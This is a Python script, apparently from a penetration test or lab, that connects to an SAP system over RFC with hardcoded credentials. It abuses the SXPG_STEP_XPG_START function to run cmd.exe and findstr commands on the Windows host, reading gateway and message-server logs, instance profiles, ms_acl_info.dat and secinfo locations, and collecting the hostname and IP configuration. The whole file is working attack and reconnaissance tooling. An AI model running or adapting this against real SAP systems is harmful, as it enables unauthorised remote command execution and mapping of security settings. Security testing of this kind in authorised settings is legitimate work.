#!/usr/bin/env python3
"""
investigate_w74_2.py — Deeper investigation with correct directory paths.
"""
import sys
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_rfc_ctypes import RFCConnection

SDK_PATH = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
HOST = '192.168.2.29'
SYSNR = '40'
CLIENT = '001'
USER = 'sapadm'
PASSWD = 'TestPass123'

BASE = dict(TARGET="", DESTINATION="", STDINCNTL="R", STDOUTCNTL="M",
            STDERRCNTL="M", TRACECNTL="0", TERMCNTL="C", TRACELEVEL="0",
            LONG_PARAMS="", CONNCNTL="H")

def sxpg(conn, prog, params, label):
    print(f"\n{'='*70}")
    print(f"[CMD] {label}")
    print(f"  {prog} {params}")
    print(f"{'='*70}")
    kw = dict(BASE, EXTPROG=prog, PARAMS=params)
    try:
        try:
            r = conn.call("SXPG_STEP_XPG_START", MXROW=9999, **kw)
        except Exception as e:
            if "MXROW" in str(e) or "RFC_INVALID" in str(e):
                r = conn.call("SXPG_STEP_XPG_START", **kw)
            else:
                print(f"  ERROR: {e}")
                return None
    except Exception as e:
        print(f"  ERROR: {e}")
        return None
    for row in r.get("LOG", []):
        line = (row.get("MESSAGE") or row.get("LINE") or row.get("TEXT") or "") if isinstance(row, dict) else str(row)
        line = line.rstrip()
        if line:
            print(f"  {line}")
    status = r.get("STATUS", "?")
    print(f"  [exit={status!r}]")
    return r

def main():
    print(f"[*] Connecting to W74 at {HOST}:{SYSNR}")
    with RFCConnection(sdk_path=SDK_PATH, ashost=HOST, sysnr=SYSNR,
                       client=CLIENT, user=USER, passwd=PASSWD, lang="EN") as conn:
        print("[+] Connected\n")

        # Read MS log from ASCS41
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c dir C:\usr\sap\W74\ASCS41\work /b',
             "List ASCS41 work directory (MS)")

        # Read dev_ms from correct path
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c type C:\usr\sap\W74\ASCS41\work\dev_ms',
             "Read dev_ms (ASCS41)")

        # Read dispatcher work dir
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c dir C:\usr\sap\W74\DVEBMGS40\work /b',
             "List DVEBMGS40 work directory")

        # Read dev_disp
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c type C:\usr\sap\W74\DVEBMGS40\work\dev_disp',
             "Read dev_disp (DVEBMGS40)")

        # Read dev_w0
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c type C:\usr\sap\W74\DVEBMGS40\work\dev_w0',
             "Read dev_w0 (DVEBMGS40)")

        # Read the instance profiles
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c type C:\usr\sap\W74\SYS\profile\W74_DVEBMGS40_WINWAS740',
             "Read DVEBMGS40 instance profile")

        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c type C:\usr\sap\W74\SYS\profile\W74_ASCS41_WINWAS740',
             "Read ASCS41 instance profile (MS)")

        # Read ms_acl_info.dat
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c type C:\usr\sap\W74\SYS\global\ms_acl_info.dat',
             "Read ms_acl_info.dat")

        # Check if secinfo exists in DVEBMGS40/work or other locations
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c dir C:\usr\sap\W74\DVEBMGS40\work\sec* /b /s',
             "Find secinfo in DVEBMGS40 work")

        # Find secinfo anywhere under W74
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c dir C:\usr\sap\W74\secinfo* /s /b',
             "Find secinfo anywhere under W74")

        # Check gateway-related files in DVEBMGS40
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c dir C:\usr\sap\W74\DVEBMGS40\work\gw* /b',
             "Find GW files in DVEBMGS40 work")

        # Read dev_rd (gateway reader log)
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c type C:\usr\sap\W74\DVEBMGS40\work\dev_rd',
             "Read dev_rd (GW reader log)")

        # Check hostname of the Windows machine
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c hostname',
             "Windows hostname")

        # Check IP configuration
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c ipconfig',
             "IP configuration")

        # Check what kernel version
        sxpg(conn, r"C:\Windows\System32\cmd.exe",
             r'/c dir C:\usr\sap\W74\DVEBMGS40\exe\disp+work.exe',
             "disp+work.exe (kernel)")

        # Look for activate_keyword_internal or any gw config
        sxpg(conn, r"C:\Windows\System32\findstr.exe",
             r'/i /s "activate_keyword_internal" C:\usr\sap\W74\SYS\profile\*',
             "Search activate_keyword_internal in profiles")

        sxpg(conn, r"C:\Windows\System32\findstr.exe",
             r'/i /s "gw/" C:\usr\sap\W74\SYS\profile\*',
             "Search all gw/ params in all profiles")

        sxpg(conn, r"C:\Windows\System32\findstr.exe",
             r'/i /s "ms/" C:\usr\sap\W74\SYS\profile\*',
             "Search all ms/ params in all profiles")

        print("\n\n[*] Investigation complete.")

if __name__ == '__main__':
    main()
